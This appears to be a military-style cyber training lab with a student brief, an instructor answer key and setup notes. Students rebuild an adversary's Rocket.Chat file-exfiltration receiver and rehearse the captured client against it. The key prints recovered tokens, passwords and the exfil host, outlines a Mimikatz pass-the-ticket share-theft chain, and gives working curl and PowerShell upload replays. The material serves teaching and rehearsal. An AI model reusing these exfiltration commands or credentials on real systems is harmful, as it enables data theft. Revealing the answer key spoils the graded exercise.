# Alternative — Reconstruct the Adversary Exfil Receiver and Rehearse SOM

## Student Brief

**Phase:** Opening block (mission prep).  
**Duration:** Instructor-flexible (individual build + rehearsal).  
**Platform:** Shared vSphere / vCenter.  
**Relationship to Alternative — Reconstruct the Adversary Exfil Receiver and Rehearse SOM:** This is an **instructor-assigned parallel option**, not a replacement and not a follow-on. Complete **this** brief **or** the document-pipeline Alternative — Reconstruct the Adversary Exfil Receiver and Rehearse SOM brief — not both unless the instructor directs otherwise.

## Operational Context

You are preparing a notional counterstrike mission against the same adversary collection path you already hunted in **prior planning and on-target group activities**. Before live execution, build a **threat-representative** slice of the **software stack the adversary used to receive stolen files**, then **rehearse** whether the captured collection/exfiltration client still lands files on terrain **you** control.

**Non-goal:** Recreating the full victim enterprise, every workstation, the complete redirector farm, or a gold-image clone of range hosts you already saw.

**Goal:** Identify and instantiate only the **critical OE elements likely to impact that receive path**, then prove — through the **actual client contract you already recovered** — that a file can be accepted, stored, and observed. Document what you could not reproduce and how that bounds the result.

This lab uses a **different** scenario from the lecture redirector example and from the other Alternative — Reconstruct the Adversary Exfil Receiver and Rehearse SOM document-pipeline brief. Apply the same decision process: match what can flip the result, compromise what does not, and document bounds so results are not over-read.

## Access (Ops Station → Build Environment)

- **Primary method: vSphere / vCenter UI + VM Remote Console** from your ops station into your folder (**first name**; add last initial only if needed to disambiguate).
    
- **Allowed fallback:** instructor-assisted console from a jump host if your role cannot open Remote Console.
    
- After you reach a guest, confirm context before you configure anything: `hostname`, `whoami`, and `pwd` (or the Windows equivalents).
    

You do **not** receive a pre-built adversary stack. Guests start **blank** (OS install from the instructor catalog / thin templates only). Offline application packages, if staged, are a mixed catalog — not a labeled answer key.

## Environment Constraints

|Constraint|Requirement|
|---|---|
|RAM|**≤ ~50 GB** concurrent powered-on memory in your resource pool|
|Addressing|Static hosts **only** in your assigned `/29` in **`172.16.45.0/24`**|
|DHCP half|**Do not** place static hosts in **`172.16.44.0/24`**|
|Media|Deploy from the instructor ISO catalog / thin templates and any staged offline packages only|
|Starting image|**Blank VMs** — no mission gold image of the adversary receiver|

Gateway and DNS for the static half are posted by the instructor. Use the block the instructor assigns from this table:

|#|Block|Usable hosts|
|---|---|---|
|1|`172.16.45.0/29`|`172.16.45.1`–`.6`|
|2|`172.16.45.8/29`|`172.16.45.9`–`.14`|
|3|`172.16.45.16/29`|`172.16.45.17`–`.22`|
|4|`172.16.45.24/29`|`172.16.45.25`–`.30`|
|5|`172.16.45.32/29`|`172.16.45.33`–`.38`|
|6|`172.16.45.40/29`|`172.16.45.41`–`.46`|
|7|`172.16.45.48/29`|`172.16.45.49`–`.54`|
|8|`172.16.45.56/29`|`172.16.45.57`–`.62`|
|9|`172.16.45.64/29`|`172.16.45.65`–`.70`|
|10|`172.16.45.72/29`|`172.16.45.73`–`.78`|
|11|`172.16.45.80/29`|`172.16.45.81`–`.86`|
|12|`172.16.45.88/29`|`172.16.45.89`–`.94`|
|13|`172.16.45.96/29`|`172.16.45.97`–`.102`|
|14|`172.16.45.104/29`|`172.16.45.105`–`.110`|
|15|`172.16.45.112/29`|`172.16.45.113`–`.118`|
|16|`172.16.45.120/29`|`172.16.45.121`–`.126`|
|17|`172.16.45.128/29`|`172.16.45.129`–`.134`|
|18|`172.16.45.136/29`|`172.16.45.137`–`.142`|
|19|`172.16.45.144/29`|`172.16.45.145`–`.150`|
|20|`172.16.45.152/29`|`172.16.45.153`–`.158`|

## Notional Mission Package (FRAGO)

### Situation

During prior planning and on-target group work you already recovered the adversary’s **collection/exfiltration client** and associated evidence (script content, configuration values, destination clues, authentication artifacts, and any notes from live hosts you surveyed). That client is the **source of truth** for this rehearsal. This brief will **not** restate those details.

Command needs a **threat-representative receiver** you control so operators can rehearse delivery, observe what lands, and later support **reconnoiter / degrade / disrupt** options against the adversary’s ability to collect (CG/CV logic from planning). Pair rehearsed TTPs with **ATT&CK** technique IDs; note **ENGAGE** / **D3FEND** language you would use with blue-space partners.

You **cannot** treat a screenshot from the original range as proof that **your** stack works. You must instantiate the receive path and exercise the **same client contract** against addresses **inside your `/29`**.

Collection also indicates (from **your** prior work — confirm in your notes, do not invent from this paragraph):

- Stolen files leave the victim terrain through an automated client, not through an interactive operator paste.
    
- The client authenticates and uploads using values recovered from the script / related artifacts.
    
- Destination identity, listen port, API shape, and backend dependencies were discoverable on the live range and in recovered files.
    
- Exact product build, runtime libraries, persistence method, and disk layout are only **partially known** unless your notes recorded them. Those unknowns are rehearsal variables.
    

**Client vs operator split:** the captured client is the background/load and the **success oracle**. **You** build and operate the receiver. Copying a file onto the receiver with `scp` / console drag-and-drop rehearses a different TTP.

### Mission

**Reconnoiter** the receive path well enough to rebuild the load-bearing pieces, then determine whether the captured client can still support later effects against the adversary’s collection capability.

Prove, through the **actual recovered client path**:

1. The reconstructed stack accepts an upload that matches the recovered client contract (method, target, authentication, and file+message fields you observed).
    
2. The landed object is observable on the receiver (UI, API, datastore, or equivalent native evidence — record which).
    
3. Which recovered values had to be **retargeted or regenerated** for a stack **you** built, and why.
    
4. Which conditions make the receive path succeed, degrade, or fail.
    

### Access constraint (mission, not vSphere)

Mission success is **captured-client upload into the receiver you built**. Do not add an interactive admin session on the receiver “to place the file” and then claim that as SOM proof. Admin access for **install and debug** is expected; the **graded rehearsal** is the client contract.

### Friendly constraint

Shared cluster; no egress for ISO or package download; stay in your IP block; preserve enough RAM for later tool testing (C2 Framework Evaluation and Peer Handoff). Classroom resource caps are a training constraint — operational ceilings will differ. Document what you could not reproduce.

If your retained planning / on-target evidence is incomplete, **do not ask the instructor to fill in destination product, credentials, or API details.** Re-collect from notes, screenshots, exports, or live range access you already hold if that access is still in scope. If a gap remains, document it, derive a **defensible substitute**, test it, and bound the claim.

## Specific Tasks

1. **Evidence inventory:** From artifacts **you already collected** in Week planning and on-target group activities, list the destination clues that change a build decision (protocol, listen behavior, authentication, upload fields, host/OS hints, persistence, dependencies). Cite the source for each item (script variable, file path, process/service, config, note). Name what you do **not** know.
    
2. **OE selection:** Keep only those OE elements that change whether the captured client can land a file. Write one sentence of rationale per kept element, and name what you will **not** build (victim file share, golden-ticket path, full redirector web stack, extra C2, and so on — unless your evidence shows that piece is load-bearing for the receive contract).
    
3. **Build:** Deploy **blank** guests in vSphere under your folder. Install and configure the kept elements. Stay inside the RAM cap and your static `/29`. Retarget every recovered destination address to **your** block; do not aim at the original range IPs.
    
4. **Client rehearsal:** Exercise the captured collection/exfiltration client (or a minimal replay you derived **from that client** after inspecting it) so it uploads into **your** receiver. Inspect before you run. Record every value you changed and why the original recovered value could not be used unchanged.
    
5. **Document live state:** Network diagram (roles + addresses), host/role
    
    - RAM table, snapshot plan (at least one pre-rehearsal snapshot), and an install/configuration journal (what you installed, in what order, and which evidence drove each choice).
6. **Friction and bounds:** Inject at least one friction condition (auth mismatch, wrong destination identity, service down, rejected content type, disk/permission fail). Vary at least one bound (product/build assumption, listen port, TLS vs cleartext, payload size). Record predicted vs observed. Tag TTPs with ATT&CK IDs.
    
7. **AAR:** Update the plan — sequencing, prerequisites, TTP choice, and the **effectiveness envelope**. Explain compromises so a reader cannot treat a lean green result as proof against every plausible adversary receiver configuration.
    

## Deliverables

Submit to the instructor:

1. **Evidence-to-build decision record** — recovered clues, source of each clue, keep/cut list with plan-linked justification, and explicit gaps plus any substitutes you derived.
    
2. **Network diagram** — roles and addresses in your `/29`.
    
3. **Host / role / RAM table** — powered-on memory totaling ≤ ~50 GB.
4. **Snapshot plan** — names and purpose.
5. **Install / configuration journal** — ordered build steps tied to evidence (not a vendor tutorial dump).
    
6. **SOM rehearsal script** — client-side steps executed, ATT&CK tags, values retargeted, friction inject, and at least one bound/limit test.
    
7. **Rehearsal after-action** — predicted vs observed; proof that a file landed (what you saw and where); plan deltas; **context and compromises**.
    

## Success Criteria

- Every powered-on VM has a plan-linked rationale (no vanity hosts).
- Concurrent RAM stays within the ~50 GB pool limit.
- All static addresses are inside the assigned upper-half block.
- Rehearsal uses the **captured-client upload path** (not a shortcut copy onto the receiver).
    
- At least one successful land is evidenced on the receiver **you** built.
    
- Recovered original-range destinations were **not** left as the live target; retargeting is documented.
    
- Rehearsal includes at least one friction inject, one limits/bounds test, and a written plan delta.
    
- Compromises and evidence gaps are documented so results can be interpreted in context.
    
- Doctrine terms (SOM, CG/CV, reconnoiter / later degrade-disrupt intent) and MITRE ATT&CK tags appear together in the rehearsal product.
    

## Tie-Back

- **Prior planning and on-target group activities:** Your collected client, IOCs, and on-target notes are the only student-facing specification for what to rebuild.
    
- **Tactical planning:** METT-TC → EMLCOA → CG/CV → SOM → rehearsal discipline.
    
- **MITRE ATT&CK:** Technique tags on collection, exfiltration, and the receive-side TTPs you rehearsed.
    
- **MITRE ENGAGE / D3FEND:** Partner-facing labels for blue-space implications of friction you observed (for example, file inspection or authentication failure).

# Adversary Exfil Stack Reconstruction — Instructor Answer Key

## Objective and starting context

This lab does **not** use a classic find-the-flag key. Grade evidence use, receiver-stack fidelity to the recovered client contract, end-to-end upload proof, budget discipline, and rehearsal rigor. Do **not** require one install method if the contract is met.

Do **not** name Rocket.Chat, version `3.12`, listen port `3000`, room ID, tokens, user IDs, admin credentials, or `/api/v1/rooms.upload/...` in student-facing talk unless grading privately.

Facilitation lives in B04.M03 instructor materials in Lesson Plans and Instructor Slides.zip. Pre-class staging lives in [`setup-guide.md`](https://moodle.cso.ops/mod/page/view.php?id=5714).

## Flag / reference table

Week 4 opening-block labs are not Puppet/Hiera-driven. Treat the following as the **known-good range defaults**. Live class values may differ if the content range was rotated; prefer student-collected evidence when it conflicts with this table, and record the rotation in the AAR.

|Item|Source / key|Default (content range)|
|---|---|---|
|Rocket.Chat base|Exfil script `$RocketChatUrl`|`203.0.113.150:3000` (scheme often omitted in the recovered script; client must still form a valid HTTP URI — students who add `http://` after a failed call are doing the right engineering)|
|Upload route|Exfil script `Invoke-RestMethod -Uri`|`{base}/api/v1/rooms.upload/{RoomId}`|
|Room ID|`$RoomId`; provisioning notes “CEO Uploads”|`Rnjgmrjyzu4zTyDvz`|
|Auth token|`$AuthToken` / header `X-Auth-Token`|`MhbQ_Bh0ETL6TaEZ_4jZdYT-fJpxlLz-Y9KxbL3B190`|
|User ID|`$UserId` / header `X-User-Id`|`fZvfWT7BbNHDgAgRG`|
|Multipart fields|`-Form`|`file` = file object; `msg` = `Uploaded from ShareDrive (<filename>)`|
|Collection path (client-side)|`$FolderPath`|`\\nisa-dc\CEO_Documents`|
|Last-run file|`$LastRunFile`|`C:\Windows\System32\Network_Share_Scripts\lastrun.txt`|
|RC install path|Range state notes|`/opt/Rocket.Chat`|
|RC listen|Range notes + script|`3000/tcp`|
|RC admin|Range login notes|`M0ver` / `12345` (login docs also show `m0ver` — treat as case-insensitive UI login)|
|RC user|Range login notes|`decrypt0r` / `decrypt0rrulez`|
|Product era|Group-activity target notes / Vulhub sibling|Rocket.Chat **3.12.x** + MongoDB **4.0** (CVE-era stack). Matching 3.12 is high-fidelity; a newer RC that still honors `rooms.upload` + token headers can pass if the student documents the version compromise.|
|Redirector SSH (optional SA)|Hunt notes|User `accesscheck` via recovered ed25519 key — **not required** to rebuild|

## Initial situational awareness

Use the receiver-guest SA block at the start of the live walkthrough below (`### 0. Initial situational awareness`). Confirm time, identity, OS, processes, and sockets before install.

## Instructor live walkthrough

Adversary collection on `it-wks-01` uses a two-stage PowerShell chain under `C:\Windows\System32\Network_Share_Scripts\`:

|Artifact|Role|
|---|---|
|`Network_Share_Setup.ps1`|Stage 1 runner; decodes and invokes the `.b64` payload (range notes also show the full upload logic inlined in this file in some report versions)|
|`Network_Share_login.b64`|Stage 2; Rocket.Chat exfil|
|`Network_setup.exe`|Mimikatz, used to PTT `ticket.kirbi` before reading `\\nisa-dc\CEO_Documents`|
|`lastrun.txt`|Last-run watermark; only files newer than this timestamp are uploaded|
|Scheduled task `\Network_Share_Connection_test` (casing varies in source notes)|Recurring execution (~5 minutes) as `nisa-internal\Lexi.Walsh` via PowerShell 7 (`pwsh.exe`)|

The **receiver** lives on **Redirector-01**:

- Rocket.Chat files under `/opt/Rocket.Chat`
- Listen port **3000/tcp**
- MongoDB backend (room/user lookup)
- systemd unit `rocketchat` (known typo risk: `multi.user.target` instead of `multi-user.target` — service may not start on boot)
    
- Admin `M0ver` / `12345`; regular user `decrypt0r` / `decrypt0rrulez`
    
- Private channel **CEO Uploads**

The captured client does **not** log in with the admin password. It uploads with a **personal access token** and **user id** against `/api/v1/rooms.upload/{roomId}`.

**What students must retarget:** recovered destination host `203.0.113.150:3000` is **outside** the student `/29`. A fresh Rocket.Chat install also **will not** reuse the original room ID, user ID, or PAT. Grade students who discover that mismatch from a failed upload and regenerate / retarget. Do **not** tell them those values in the student brief.

**What is out of scope for a passing reconstruction:** reproducing the Kerberos PTT / `\\nisa-dc\CEO_Documents` collection side. A local test file fed to a retargeted client (or a derived replay of the same REST contract) is an acceptable rehearsal payload. Students who also rebuild the share path may do so only with RAM/rationale discipline.

Tie every recovered value to **prior Week 1/3 evidence**, then to why it justifies the next action. Students should write this in the decision record; you use it to catch spoiler-following.

|Value|How students know|Transition reasoning|
|---|---|---|
|Destination host/port `203.0.113.150:3000`|Deobfuscated exfil script `$RocketChatUrl`; live redirector listen table if they surveyed greyspace|That is the **original** receiver. It cannot be the live target for **this** vSphere `/29`. They keep port/protocol fidelity and change the host to their VM.|
|`/api/v1/rooms.upload/$RoomId`|Same script `Invoke-RestMethod -Uri`|First-time seeing a REST upload: this is the **contract** the receiver must honor. Installing “a chat app” that only has a web UI is incomplete until this route accepts the multipart POST.|
|Headers `X-Auth-Token`, `X-User-Id`|Script `$Headers` hashtable|Password login (`M0ver`/`12345`) is how **operators** admin the app, not how **malware** authenticates. Grade the token path for the rehearsal.|
|Room ID `Rnjgmrjyzu4zTyDvz`|Script `$RoomId`; Mongo `rocketchat_room` on the original redirector|Fresh installs mint a **new** ID. Students who paste the original ID into a new RC get 4xx/“room not found.” The recovery action is: look up **their** room ID (UI or Mongo) and retarget.|
|Token / user ID pair|Script variables; RC “Personal Access Tokens” UI on the original|Same mismatch on a new instance. Generate a PAT as the user who can post to the room; copy **both** token and user id.|
|`file` + `msg` form fields|Script `$Form`|Bounds tests that drop `msg` or send a raw body (not multipart) are useful friction — the recovered client uses both fields.|
|Product Rocket.Chat 3.12|Week 3 group-activity notes (exploit against RC 3.12 on the redirector); `/opt/Rocket.Chat` if they had redirector shell; HTTP fingerprint/title if they browsed `:3000`|Evidence-driven product selection. If they missed the product name, they still have the API path — acceptable if they document the gap and still meet the contract.|
|`/opt/Rocket.Chat` + systemd|Redirector filesystem / `systemctl` if surveyed|Nice-to-have fidelity; not required if the listen port and API match and the AAR records the path compromise.|
|`pwsh.exe` / PS7|Scheduled-task action on `it-wks-01`|Explains why a student replay on Windows PowerShell 5.1 may fail (`-Form` missing). Derived `curl` is a valid substitute if they inspected the script first.|

Use this as a **facilitator demo** on a spare `/29` (or a projector VM), not as a student worksheet. Commands below use `172.16.45.1` as the receiver example — replace with the demo block.

**Runtime validation note:** this walkthrough is sourced from the content-range docs and the recovered client. **It has not been executed in the closed training environment by the authoring pass.** Confirm offline package names, systemd unit file, and first-run wizard clicks against the staged 3.12.x bundle before class, and paste any facility-specific deviations into the staging table above.

### 0. Initial situational awareness (receiver guest)

Establish time, identity, session, interpreter, OS, users, processes, and sockets **before** you install anything. Why it matters: students skip this and later cannot tell whether listen `:3000` failed because RC is down, bound to localhost, or colliding with another process.

```
date -u
timedatectl
hostnamectl
hostname
whoami
id
echo "$SHELL"
ps -p $$ -o args=
uname -a
cat /etc/os-release
who
w
ps -ef | head -n 40
ss -tulpen
ss -tupen
```

**First use:**

- `date -u` / `timedatectl` — UTC vs local clock. Upload last-run logic on the **client** is datetime-sensitive; receiver logs are easier to correlate with a known clock.
    
- `hostnamectl` / `hostname` — host identity you will put on the diagram.
    
- `whoami` / `id` — confirm you are installing as root/sudo before you blame “permission denied” on Rocket.Chat.
    
- `echo "$SHELL"` and `ps -p $$ -o args=` — which interpreter will run later `systemctl` / `mongo` snippets (bash vs sh).
    
- `uname -a` and `cat /etc/os-release` — package selection for Mongo/RC must match this guest; do not copy Ubuntu commands onto a RHEL guest blindly.
    
- `who` / `w` — other sessions (instructor assist vs student).
    
- `ps -ef | head -n 40` — **full-ish** process sample before filtering; you are looking for unexpected web/db processes on a “blank” VM.
    
- `ss -tulpen` — listening TCP **and** UDP with processes. Why `-tulpen`: `-t` TCP, `-u` UDP, `-l` listening, `-p` process, `-e` extra, `-n` numeric (no DNS delay). After RC install you expect `3000` and localhost `27017`.
    
- `ss -tupen` — established connections (no `-l`), used later to see the client POST.
    

**Expected findings on a blank guest:** no listener on `3000`; maybe `ssh` on `22` if you enabled it. OS ID matches the ISO you staged. If `3000` is already open, the VM is not blank — stop and rebuild.

### 1. Place the VM on the assigned `/29`

Configure a static address in the student block (example `.1`). Why: recovered `203.0.113.150` is TEST-NET documentation/range greyspace — sending the client there from this cluster will not prove **their** OE.

How students know to pick a new IP: the brief forbids original-range destinations and requires the assigned `/29`. Transition: recovered port and API stay; **host** becomes the VM they just addressed.

### 2. Install MongoDB 4.0 with a replica set

Rocket.Chat 3.x expects Mongo **and** a replica set (oplog). A standalone `mongod` without `rs.initiate` is a common student failure mode (RC crash loop).

Inspect staged packages before installing (offline catalog path from the staging table). Then install per the vendor packages you staged. After `mongod` is running:

```
ss -tulpen
```

Confirm `27017` is listening (preferably `127.0.0.1`, not `0.0.0.0`, unless they split DB onto a second host with rationale).

Initiate the replica set (mongo shell 4.0). **First use:** `mongo` opens the MongoDB shell; `rs.initiate(...)` creates replica set `rs0` with this host as the only member — required so Rocket.Chat can use the oplog.

```
rs.initiate({ _id: "rs0", members: [ { _id: 0, host: "localhost:27017" } ] })
rs.status()
```

**Expected snippet:** `"ok" : 1` from `rs.initiate`, and `rs.status()` showing a PRIMARY. If initiate errors with “already initialized,” inspect `rs.status()` instead of running it again.

**How students know Mongo is in play:** recovered receiver is a multi-component app; Week 3 notes and redirector survey (`mongo` binary, `rocketchat` database) if they had shell. If they only have the HTTP API, they may still install RC’s documented dependency. Grade the **working upload**, not whether they named Mongo in hour one.

### 3. Install Rocket.Chat 3.12.x under `/opt/Rocket.Chat`

Copy the staged bundle and unpack to `/opt/Rocket.Chat` (range path). Create parent directories first if `/opt/Rocket.Chat` does not exist.

Set environment consistent with the recovered cleartext HTTP listener:

- `PORT=3000`
- `ROOT_URL=[http://172.16.45.1:3000](http://172.16.45.1:3000)` (demo IP)
- `MONGO_URL=mongodb://localhost:27017/rocketchat`
- `MONGO_OPLOG_URL=mongodb://localhost:27017/local`

Enable and start the service. **First use:** `systemctl enable --now NAME` enables on boot **and** starts immediately; `systemctl status NAME` is the authoritative unit health view (not just `ps`).

```
sudo systemctl enable --now rocketchat
sudo systemctl status rocketchat --no-pager
ss -tulpen
```

**Expected findings:** unit `active (running)`; `ss` shows `*:3000` or `0.0.0.0:3000`. If the unit is `failed`, do not grep logs first as a jump — read `systemctl status` and the full unit file. Range-known defect: WantedBy `multi.user.target` (typo) instead of `multi-user.target`, so the service does not start on boot.

**How students know port 3000:** `$RocketChatUrl` in the recovered script (host:port). Transition: they observed the client targeting that port, so a receiver listening on 80/443 only is the wrong contract unless they also change the client and document it as a compromise.

Browse `[http://172.16.45.1:3000](http://172.16.45.1:3000)` from the ops station and complete the first- run wizard. Create an admin (range used `M0ver` / `12345` — students may choose their own; matching is optional flavor, not a grade item). Create a room (range name `CEO Uploads`).

### 4. Generate PAT and recover **this instance’s** room ID and user ID

**Personal Access Token (UI):** logged-in user → My Account → Personal Access Tokens → generate. Copy **token** and **user id** together. Why: the malware does not prompt for a password; it presents these two headers on every POST.

**Room ID via Mongo** (range operator method). **First use:** `show dbs` lists databases; `use rocketchat` selects the app DB; `show collections` lists collections; `db.rocketchat_room.find({}, { name: 1 })` projects room name (and by default includes `_id`, which **is** the room ID the API wants).

```
show dbs
use rocketchat
show collections
db.rocketchat_room.find({}, { name: 1 })
db.users.find({}, { username: 1, name: 1, emails: 1 })
```

**Expected snippet (shape, not original IDs):**

```
{ "_id" : "AbCdEf12345678901", "name" : "ceo-uploads" }
{ "_id" : "XyUserIdFromThisVm", "username" : "m0ver" }
```

**How students know to look in Mongo:** range Rocket.Chat notes and/or redirector shell history. Alternate path: Rocket.Chat UI / API `channels.info` or copying the room ID from the browser URL — acceptable if they get the ID the upload route requires.

Do **not** expect the original `Rnjgmrjyzu4zTyDvz` / original PAT to work here. That is the teaching point.

### 5. Inspect the captured client before any replay

On the instructor demo, open the range script (`course/operations/csoc_content_range/Range setup/Scripts/Exfil script.md`). Students inspect **their** recovered copy.

Pre-execution inspection (do this **before** running):

- Identify destination, headers, form fields, and side effects (mimikatz PTT, UNC share, write to `lastrun.txt`).
    
- For rehearsal against a student receiver, **do not** run mimikatz or target `\\nisa-dc\CEO_Documents`. Those steps authenticate to the **victim share**, not to Rocket.Chat.
    
- Confirm the interpreter: **PowerShell 7** (`pwsh`) because `-Form` on `Invoke-RestMethod` is a PowerShell 6+ feature.
    
- Sanity: retarget `$RocketChatUrl` to `[http://172.16.45.1:3000](http://172.16.45.1:3000)` (include a scheme if the recovered string lacks one). Replace `$RoomId`, `$AuthToken`, `$UserId` with **this VM’s** values. Point `$FolderPath` at a local folder containing one test file, or use the derived `curl` below.
    

**First use (`Invoke-RestMethod`):** PowerShell cmdlet that sends an HTTP request and deserializes JSON. `-Uri` is the full upload route; `-Headers` supplies token auth; `-Method Post` is required (the API does not upload on GET); `-Form` builds multipart form-data matching `file` and `msg`.

Minimal derived replay (Linux generator or ops station). **First use:** `curl -X POST` sends the HTTP method; `-H` adds one header per appearance; `-F` adds a multipart field (`file=@path` attaches file contents). `-sS` silences the progress bar but still shows errors.

```
echo 'rehearsal test' > /tmp/share_sample.txt
curl -sS -X POST \
  -H "X-Auth-Token: REPLACE_WITH_VM_TOKEN" \
  -H "X-User-Id: REPLACE_WITH_VM_USERID" \
  -F "file=@/tmp/share_sample.txt" \
  -F "msg=Uploaded from ShareDrive (share_sample.txt)" \
  "http://172.16.45.1:3000/api/v1/rooms.upload/REPLACE_WITH_VM_ROOMID"
```

**How students know these flags/values:** they come from the recovered script (`$Headers`, `$Form`, URI template). Transition: after a failed call with original-range IDs, they substitute **instance-local** IDs they just read from UI/Mongo — that is retargeting, not cheating.

PowerShell 7 equivalent (after retargeting variables):

```
$RocketChatUrl = "http://172.16.45.1:3000"
$RoomId        = "REPLACE_WITH_VM_ROOMID"
$AuthToken     = "REPLACE_WITH_VM_TOKEN"
$UserId        = "REPLACE_WITH_VM_USERID"
$Headers = @{
  "X-Auth-Token" = $AuthToken
  "X-User-Id"    = $UserId
}
$Response = Invoke-RestMethod `
  -Uri "$RocketChatUrl/api/v1/rooms.upload/$RoomId" `
  -Headers $Headers `
  -Method Post `
  -Form @{
    file = Get-Item "/tmp/share_sample.txt"
    msg  = "Uploaded from ShareDrive (share_sample.txt)"
  }
$Response | ConvertTo-Json -Depth 5
```

### 6. Confirm the file landed

**API success shape** (key lines; full JSON is longer than 10 lines — keep `success` and filename):

```
{
  "success": true,
  "message": {
    "file": { "name": "share_sample.txt" }
  }
}
```

Why those lines matter: `success: true` is the client’s own oracle (the malware branches on `$Response.success`). The nested file name proves the multipart field was accepted, not just a chat text message.

**UI:** open the room; attachment visible with the `msg` text prefix `Uploaded from ShareDrive`.

**Optional native evidence:** Rocket.Chat file store under the install tree / GridFS in Mongo. Students should record **which** evidence they used.

Re-check sockets during the POST:

```
ss -tupen
```

Expect an established TCP to `:3000` from the generator.

### 7. Friction inject and bounds test (demo one of each)

**Friction (predicted fail):** replay the same `curl` with the **original range** token/room ID against the student VM.

Expected: HTTP 401/403 or JSON `success: false` / “unauthorized” / “invalid room”. Why it matters: proves the original secrets are bound to the original instance; retargeting is mandatory.

**Bounds (pick one):**

- Stop `rocketchat` (`systemctl stop rocketchat`) and retry — connection refused; maps the service as load-bearing.
    
- Listen on `3001` but leave the client on `3000`.
    
- Upload an oversized or disallowed type if the 3.12 settings reject it.
- Use HTTP vs HTTPS depending on what the recovered client actually sent (range client is cleartext HTTP to `:3000`).

Record predicted vs observed; tag ATT&CK (at minimum T1041 Exfiltration Over C2 Channel and T1071.001 Web Protocols; collection T1005 / T1039 as applicable). Pair D3FEND/ENGAGE language for “file inspection” or “credential-based restriction” if friction was auth or content reject.

### 8. Snapshot and AAR close

Take a named pre-rehearsal snapshot **before** destructive bounds tests. AAR must include: values retargeted; proof of land; friction; envelope; compromises (for example “did not rebuild `\\nisa-dc`”; “used curl derived from the script”; “RC 3.12 vs newer”).

## Troubleshooting / confirmation

Do not scatter these into walkthrough steps during grading.

- **Cannot power on:** Pool at 50 GB; power off idle VMs; drop guest RAM.
- **Console gray:** Student role missing Remote Console; use fallback; check VM tools / host console service.
    
- **No DHCP in upper half:** Expected — static in `172.16.45.0/24`.
    
- **ISO / package missing:** Content library permissions; remount datastore; confirm offline catalog path from the staging table.
    
- **Student wants nested ESXi or internet pull:** Out of scope.
    
- **Student rebuilds the lecture PHP redirector or the other L4.0.a SFTP pipeline:** Redirect to **this** FRAGO — captured Week 1/3 exfil client, not those scenarios.
    
- **Rocket.Chat unit fails on boot:** Check `WantedBy=` for `multi.user.target` typo; fix to `multi-user.target`; `daemon-reload`; enable --now.
    
- **RC crash loop:** Mongo down or replica set not initiated; `ROOT_URL` / `MONGO_URL` wrong; insufficient RAM.
    
- **Upload 401 / invalid token:** Using original-range PAT on a new instance, or token/user id pair split across two users.
    
- **Upload 400 / room not found:** Original room ID pasted; room is private and the token user is not a member.
    
- **`Invoke-RestMethod: A parameter cannot be found that matches parameter name 'Form'`:** Windows PowerShell 5.1 — switch to `pwsh` or `curl`.
    
- **Invalid URI:** Recovered `$RocketChatUrl` lacks `http://` — add scheme when retargeting.
    
- **`lastrun.txt` access denied:** Range note: hidden `lastrun.txt` can deny writes. For this lab, use a local last-run path on the generator or a one-shot derived replay.
    
- **`curl` succeeds, recovered script fails:** Script still PTT/share-bound, still pointed at greyspace, or running under 5.1. Inspect the live variables they actually executed.
    
- **Success JSON but nothing in UI:** Wrong room ID (posted elsewhere) or viewing as a user who cannot see the private room.
    

|Pattern|Why it fails the objective|Instructor push-back|
|---|---|---|
|Asks you for the product / PAT / room ID|Brief forbids spoiling Week 1/3 collection|“What’s in your recovered script and hunt notes?”|
|Rebuilds full Lunovia + greyspace|Volume ≠ load-bearing receive contract|“Which recovered client field dies without that host?”|
|Gold-image clone of redirector|Skips OE selection|Blank VMs only; justify each package from evidence|
|Client unchanged (`203.0.113.150`)|Dest is not their OE|Retarget host; keep contract|
|Pastes original room ID/token into new RC|IDs are instance-specific|Generate PAT; Mongo/UI lookup of **this** room|
|Admin UI file upload as “success”|Wrong TTP|“Did the recovered client land it?”|
|Windows PowerShell 5.1 `-Form`|Cmdlet parameter does not exist|`pwsh` or derived `curl` after inspection|
|Runs mimikatz / PTT in the classroom OE|Victim-side, out of scope, noisy|Local test file; skip golden ticket|
|Mongo without replica set|RC 3.x will not stay healthy|`rs.initiate`|
|RC on 80 only|Recovered client uses `:3000`|Match port or document a client change as compromise|
|Docker compose because Week 2 Vulhub exists|Not the range receiver shape; Docker may be absent|Allowed only if staged **and** they bound the compromise|
|Static IP in `172.16.44.0/24`|DHCP collision|Move into assigned `/29`|
|No ATT&CK tags|Breaks bilingual fluency|Tag exfil/web-protocol techniques|
|Leaving everything powered on|Starves L4.0.b|Power off idle VMs|

## Grading checkpoints

Map to rubric row IDs in [L4.0.a Alternative Assessment Rubric.md](https://moodle.cso.ops/mod/assign/view.php?id=5712).

|Checkpoint|Evidence|Rubric|
|---|---|---|
|Evidence-to-build linkage|Decision record cites Week 1/3 artifacts for product/API/auth/port; gaps named|ES-1|
|Keep/cut rationale|Victim share / golden ticket / Havoc cut unless justified; receiver kept|ES-2|
|Path fidelity|Rehearsal is client POST, not console/UI file drop claimed as SOM|ES-3|
|Dest retarget|AAR shows host moved into `/29`; original `203.0.113.150` not left as live dest|ES-4|
|Auth contract|Token + user id headers; room ID from **this** instance|ES-5|
|Successful land|`success: true` and/or room attachment evidence|ES-6|
|Journal quality|Ordered install steps tied to evidence, not a generic blog paste|ES-7|
|Friction + bounds|At least one predicted fail and one envelope test|ES-8|
|Budget / addressing|RAM table ≤ ~50 GB; static IPs in assigned `/29`|ES-9|
|Snapshots|Named pre-rehearsal snapshot|ES-10|
|Compromises + plan delta|AAR bounds claims; SOM/TTP change recorded|ES-11|
|Doctrine + MITRE pairing|SOM/CG/CV language plus ATT&CK tags|ES-12|

**Acceptable-answer guidance:**

- **Pass:** RC (3.12 preferred) accepts multipart `rooms.upload` with token headers from a retargeted recovered client or inspected derived replay; file visible; original-range dest not used; keep/cut list exists.
    
- **Do not fail** solely for: not matching original room ID string; not installing at `/opt/Rocket.Chat`; not rebuilding the UNC share; using `curl` after inspecting the script; choosing a newer RC if they document API-contract testing.
    
- **Fail:** instructor-fed product/API details with no evidence trail; claiming UI drag-and-drop as the SOM; still targeting `203.0.113.150`; no upload evidence; vanity AD/C2 farm with no receiver.

# L4.0.a Alternative Instructor Setup Guide and Facilitator Notes

**Lab:** L4.0.a Alternative — Reconstruct the Adversary Exfil Receiver and Rehearse SOM  
**Audience:** Instructors / range operators  
**Student doc:** [L4.0.a Alternative Student Brief.md](https://moodle.cso.ops/mod/assign/view.php?id=5712)  
**Rubric:** [L4.0.a Alternative Assessment Rubric.md](https://moodle.cso.ops/mod/assign/view.php?id=5712)  
**Shared env:** `environments/effects_lab_env/vsphere/README.md`  
**Range truth (do not edit; instructor reference only):**

- `course/operations/csoc_content_range/Range setup/Scripts/Exfil script.md`
